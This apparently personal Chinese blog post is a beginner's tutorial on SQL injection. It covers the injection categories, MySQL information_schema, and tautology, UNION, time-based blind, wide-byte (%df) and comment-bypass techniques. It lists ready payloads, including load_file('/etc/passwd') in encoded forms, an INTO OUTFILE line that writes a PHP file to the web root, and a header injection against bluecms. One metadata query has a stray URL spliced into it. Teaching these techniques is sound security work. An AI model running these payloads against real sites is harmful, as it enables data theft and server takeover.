---
title: "sql注入简单入门"
date: 2020-12-14T22:31:35+08:00
draft: false
author: "fan"
subtitle: "安全"
tags: ["安全"]
categories: ["安全"]
toc:
  enable: true
  auto: true
---



## SQL注入分类

**按照注入点类型进行分类**

数字注入点：

- url形式大概为： http://xxx.com/sql.php?id=1
- sql语句大概原型： select * from table_name where id={$id}

字符型注入点：

- url形式大概为：http://xxx.com/sql.php?name=admin
- sql语句大概原型为：select * from table_name where name='{$name}'



按照数据提交的方式来分类

- GET输入
- POST注入
- Cookie注入
- 搜索注入
- HTTP头部注入



其他注入

- 伪静态注入
- base64注入
- 二阶注入
- XML实体注入
- phpcmsv8 authkey 注入
- ......



按照页面返回结果分类

- 有回显----> union注入，报错注入
- 无回显----> 布尔类型注入，延迟注入（sleep函数和benchmark函数）



SQL 常用的工具

- Safe3wvs
- WebCruiser
- Appscan
- Acunetix WVS
- X-ray



一些可能用到的url编码

```
backspace：8%

tab：9%

space：20%
!： 21%

"： 22%

#：23%

%： 25%

'： 27%

(： 28%

)： 29%

,： %2C

/： %2F

*： %2A

-： %2D

.： %2E
换行：%0A
```



### mysql中 information_schema

在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表。

SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。

TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。

COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。

STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。

USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。

SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。

TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。

COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。

CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。


COLLATIONS表：提供了关于各字符集的对照信息。

COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。

TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。

KEY_COLUMN_USAGE表：描述了具有约束的键列。

ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。

VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。

TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表





## SQL注入漏洞挖掘



内联SQL注入：注入SQL语句后，原来的语句仍会全部执行。

| 测试字符串             | 变种                   | 预期结果                                              |
| ---------------------- | ---------------------- | ----------------------------------------------------- |
| '                      |                        | 触发错误，如果成功，数据库将返回一个错误              |
| Value+0                | Value-0                | 如果成功，将返回与原请求相同的结果                    |
| Value*1                | Value/1                | 如果成功，将返回与原请求相同的结果                    |
| 1 or 1=1               | 1)or (1=1              | 永真条件。如果成功，将返回列表中所有的行              |
| value or 1=2           | value) or (1=2         | 空条件。 如果成功，将返回与原请求相同的结果           |
| 1 and 1=2              | 1) and (1=2            | 永假条件。如果成功则不返回列表中任何行                |
| 1 or 'ab' = 'a' + 'b'  | 1) or ('ab'=a+'b'      | SQL Server 串联。如果成功，则返回与永真条件相同的信息 |
| 1 or 'ab'='a''b'       | 1) or ('ab'='a''b'     | Mysql 串联。如果成功，则返回与永真条件相同的信息      |
| 1 or 'ab'='a' \|\| 'b' | 1) or ('ab'='a'\|\|'b' | oracle串联。如果成功，则返回与永真条件相同的信息      |



| 数字型                       | 字符型                                    |
| ---------------------------- | ----------------------------------------- |
| and 1=1   /  and 1=2         | and '1' = '1  /   and '1'='2              |
| OR 1=1    /   or 1=2         | or '1' = '1    /     or '1' = '2'#        |
| +   -  *  /  >  <   <=  >=   | +'/+'1     -'0/-'1     >      <   <=   >= |
| 1 like 1   1/1  like 2       | 1'   like '1/1'   like '2                 |
| 1 in (1,2)   /    1 in (2,3) | 1'   in  ('1')#/'1' in ('2')#             |



**数据库的比较运算符**

- 数字比较和数学一样
- 数字与字符串比较，取字符串的第一位开始的数字，拿该数字进行比较，如果是字符则拿0进行比较，如：'41abcd' > 40 为真， 'a4bcd' = 0 为真
- 字符串与字符串比较，两个字符串的不相同处开始分别取一个字符的ASCII进行比较，如：’a‘ < 'b' 为真; 'abcd'='abcd'为真; 'abcd' > 'abca' 为真



**数据库的注释语法**

SQL Server 和Orcal: 

- 单行注释：`--`
- 多行注释：`/× ×/`

Mysql

- 单行注释，注释从#字符到行尾：`#`
- 多行注释：`/× ×/`
- 用于单行注释（要求第二个-后面根一个空格或控制字符，如制表符，换行符）：`--`



**sql中函数**

- user()
- database()
- version()
- @@hostname
- @@datadir
- @@version_compile_os
- show tables;
- SUBSTRING(name,5,3) 截取name这个字段 从第五个字符开始 只截取之后的3个字符
- SUBSTRING(name,3) 截取name这个字段 从第三个字符开始，之后的所有个字符
- SUBSTRING(name, -4) 截取name这个字段的第 4 个字符位置（倒数）开始取，直到结束
- left（name,4）截取左边的4个字符
- right（name,2）截取右边的2个字符
- SELECT MID(column_name,start[,length]) FROM table_name
- loadfile()
- concat()  多个字符串连接成一个字符串。
- concat_ws()
- group_concat() 连接一个组的所有字符串，并以都好分割每一条数据



**MySQL 的SQL注入：获取元数据**

MySQL 5.0及以上版本提供了INFORMATION_SCHEMA这个信息数据库,它提供了访问数据库元数据的方式

```sql
Select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA limit 0,1

Select TABLE_NAME from INFORMATION_SCHEMA.TABLES where
TABLE_SCHEMA=(select DATABASE()) limit 0,1

Select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where
TABLE_SCHEMA=(select DATABASE())https://www.oldboyedu.com/book/26%2027%%20and%201=1#.html limit 0,1

```



**Mysql的SQL注入：UNION查询**

UNION会去掉重复的行，如果不想去掉，可使用UNION ALL

必备条件：

- 所有查询中必须具有相同的结构
- 对应列的数据类型可以不同但是必须兼容
- 如果为XML数据类型则列必须等价

例子： `select id,user,passwd from users union select 1,2,3;`

**MySQL延迟注入**

- 延迟注入是通过页面返回的时间来判断的
- 不同的mysql数据库版本延迟注入的语句也不同
- mysql >= 5.0 的可以使用sleep()进行查询
- mysql < 5.0 可以使用benchmark()进行查询
- benchmark()的用法
- benchmark(n,sql语句)n为查询次数
- 通常查询时间的增多返回时间变得缓慢来判断是否存在延迟注入
- select benchmark(1000,select * from admin)
- sleep()延迟注入用法
- sleep可以强制产生一个固定的延迟。
- sleep()延迟注入核心原理
- and if(true,sleep(5),0);==IF(1=1,true,false);
- id=1 and sleep(5) 不断下是否存在延迟注入
- and if(substring(user(),1,4)='root',sleep(5),1)判断当前用户
- and if(MID(version(),1,1)like 5,sleep(),1)判断数据库版本信息是否为5
- 可以去猜解他的数据库
- and if(ascii(substring(database(),1,4))>100,sleep(5),1)
- sqlmap --time-sec 延迟注入



**base64编码注入**

- 解码
- 构造语句
- 编码
- $id = base64_decode($id)







### 二阶注入

SQL注入一般可分为两种,一阶注入(普通的SQL注入)和二阶SQL注入



一阶SQL注入发生在一个HTTP请求和响应中,系统对攻击输入立刻反应执行。一阶注入的攻击过程归纳如下:

- 攻击者在HTTP请求中提交恶意SQL语句

- 应用处理恶意输入,使用恶意输入动态构造sql语句

- 如果攻击实现,在响应中像攻击者反应结构

  

二阶注入,作为sql注入的一种,他不同于普通的sql注入,恶意代码被注入到web应用中不立即执行,而

是存储到后端的数据库中,在处理另一次不同的请求时,应用检索到数据库中的恶意输入并利用它动态

构建sql语句,实现了攻击。



二阶sql注入的攻击过程归纳如下:

- 攻击者在一个HTTP请求中提交恶意输入
- 用于将恶意输入保存在数据库中
- 攻击者提交第二个HTTP请求
- 为处理第二个HTTP请求,应用检索存储在后端数据库中的恶意输入,动态构建sql语句
- 如果攻击实现,在第二个请求的响应中向攻击者返回结构



一个实际的例子请看：http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-074893



### XFF头注入

一个实际的例子是在bluecms v1.6 sp1 版本中在留言页面，通过在头部注入：`Client-Ip: 127.0.0.3',@@datadir)#`

如下图：

[![rer2e1.png](https://s3.ax1x.com/2020/12/13/rer2e1.png)](https://imgchr.com/i/rer2e1)



注入之后的结果如下：

[![rer4JO.png](https://s3.ax1x.com/2020/12/13/rer4JO.png)](https://imgchr.com/i/rer4JO)





### mysql 注入-load_file()函数

load_file() 函数注入的条件：

- 文件必须在服务器上
- 知道站点物理路径
- MySQL用户必须拥有对此文件读取的权限
- LOAD_FILE()函数操作文件的当前目录是@@datadir(即数据库存储路径)
- 文件大小必须小于 max_allowed_packet,@@max_allowed_packet的默认大小是16M



例子：

```sql
Union select 1,load_file(‘/etc/passwd’),3,4#
Union select 1,load_file(0x2f6574632f706173737764),3,4#
Union select 1,load_file(CHAR(47, 101, 116, 99, 47, 112, 97, 115, 115,119, 100)),3,4#
1' union select 1,table_name from information_schema.tables where table_schema='dvwa'#
/*!select*/ * from users;
select benchmark(10000000, encode("hello", "world"))
select concat(user(), database(), version())
select concat_ws(",",user(), database(), version())
```



**注意： load_file 不显示内容的时候可以尝试id=999999这种不存在值进行尝试**



### Into outfile 注入

 Into outfile 写文件操作，必备条件：

-  magic_quotes_gpc()=OFF
-  用户有文件操作可写文件权限
-  INTO OUTFILE 不可以覆盖已存在的文件。
-  INTO OUTFILE 必须是最后一个查询。
-  知道网站的绝对路径



 SQL语句如下:

```
 Select ‘<?php phpinfo();?>’ into outfile ‘d:\www\1.php’
 Select char(99,58,92,50,46,116,120,116) info outfile ‘d:\www\1.php’
```



### 宽字节注入

GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节,实际上只有两字节。宽字
节带来的安全问题主要是吃ASCII字符(一字节)的现象。

 %df’ 被PHP转义(开启GPC、用addslashes函数,或者icov等),单引号被加上反斜杠\,变成了
%df\’,其中\的十六进制是 %5C ,那么现在 %df\’ =%df%5c%27,如果程序的默认字符集是GBK等宽字
节字符集,则MySQL用GBK的编码时,会认为 %df%5c 是一个宽字符,也就是縗’,也就是说:%df\’ =
%df%5c%27=縗’,有了单引号就可以注入了



### 注入小技巧总结

在注入的时候,可以把空格换成”+”或者”/**/”,这都是等价的把容易被过滤的东西放到/*!XXX*/中,一样可以
正常查询,也就是/*!select*/=select,原理就是MYSQL中 为了保持兼容,比如从mysqldump 导出的SQL语句能被
其它数据库直接使用,它把一些特有的仅在MYSQL上的语句放在 / ! ... */中,这样这些语句如果在其它数据库
中是不会被执行,但在MYSQL中它会执行,另外感叹号有特殊意义,比如/*!55555,xxx*/的意思是:若MYSQL版
本号高于或者等于5.55.55语句将会被执行,如果感叹号后面不加入版本号,MySQL将会直接执行SQL语句。
当union select 1,2,3,4没有出现数字位时,可以尝试把数字都换成null,然后逐个尝试替换成数字或字符或直接
换成version(),找到可以显示出来的那一位,一般在Oracle和SQLServer中,列的数据类型在不确定的情况下,
最好使用NULL关键字匹配。

- Select suser_name():返回用户的登录标识名
- Select user_name():基于指定的标识号返回数据库用户名
- Select db_name():返回数据库名称
- Select is_member(‘db_owner’):是否为数据库角色
- Select convert(int,’5’):数据库类型转换


